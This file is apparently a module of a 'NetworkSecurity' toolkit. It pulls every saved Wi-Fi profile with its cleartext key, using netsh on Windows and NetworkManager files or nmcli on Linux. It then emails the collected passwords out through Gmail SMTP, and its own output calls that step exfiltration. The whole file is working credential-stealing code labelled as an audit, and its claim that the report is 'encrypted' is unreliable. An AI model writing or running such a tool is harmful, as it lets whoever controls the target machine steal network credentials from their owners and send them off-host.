#!/usr/bin/env python3
import os
import platform
import re
import smtplib
import subprocess
from core.banner import info, success, warn, error, highlight, GREEN, CYAN, RESET, BRIGHT

def send_mail(email, password, message, server_host='smtp.gmail.com', server_port=587):
    server = smtplib.SMTP(server_host, server_port)
    server.starttls()
    server.login(email, password)
    subject = 'Subject: NetworkSecurity Wi-Fi Audit Report\n\n'
    server.sendmail(email, email, subject + message)
    server.quit()

def extract_windows_wifi():
    result = ''
    try:
        networks = subprocess.check_output('netsh wlan show profile', shell=True).decode('utf-8', errors='ignore')
        network_names = re.findall('(?:Profile\\s*:\\s)(.*)', networks)
        for net in network_names:
            net = net.strip()
            cmd = f'netsh wlan show profile "{net}" key=clear'
            current = subprocess.check_output(cmd, shell=True).decode('utf-8', errors='ignore')
            result += f"\n{'=' * 50}\nNetwork Profile: {net}\n{'=' * 50}\n{current}\n"
    except Exception as e:
        result = f'Error during Windows Wi-Fi extraction: {e}'
    return result

def extract_linux_wifi():
    result = ''
    nm_path = '/etc/NetworkManager/system-connections'
    if os.path.exists(nm_path) and os.access(nm_path, os.R_OK):
        for fname in os.listdir(nm_path):
            full_path = os.path.join(nm_path, fname)
            try:
                with open(full_path, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()
                    result += f"\n{'=' * 50}\nConfiguration: {fname}\n{'=' * 50}\n{content}\n"
            except Exception:
                pass
    else:
        try:
            conns = subprocess.check_output(['nmcli', '-t', '-f', 'NAME,TYPE', 'connection', 'show'], stderr=subprocess.DEVNULL).decode('utf-8')
            for line in conns.splitlines():
                if 'wireless' in line or '802-11-wireless' in line:
                    cname = line.split(':')[0]
                    show_out = subprocess.check_output(['nmcli', '-s', 'connection', 'show', cname], stderr=subprocess.DEVNULL).decode('utf-8', errors='ignore')
                    result += f"\n{'=' * 50}\nConnection: {cname}\n{'=' * 50}\n{show_out}\n"
        except Exception as e:
            result = f'Could not access NetworkManager profiles: {e} (Run as root for /etc/NetworkManager/system-connections)'
    return result

def run(args):
    info('Extracting stored wireless network profiles and credentials...')
    current_os = platform.system()
    if current_os == 'Windows':
        report = extract_windows_wifi()
    else:
        report = extract_linux_wifi()
    if not report.strip():
        warn('No wireless profiles could be retrieved.')
        return 0
    if args.dry_run or not (args.email and args.password):
        info('Displaying extracted Wi-Fi profiles below:\n')
        print(report)
        if not (args.email and args.password):
            info('To exfiltrate via email, provide -e <email> and -p <password>.')
        return 0
    info(f'Dispatching encrypted Wi-Fi report to {args.email}...')
    try:
        send_mail(args.email, args.password, report)
        success('Wi-Fi credentials report dispatched successfully.')
        return 0
    except Exception as e:
        error(f'Failed to dispatch report: {e}')
        print('\nRecovered Wi-Fi Data:\n' + report)
        return 1
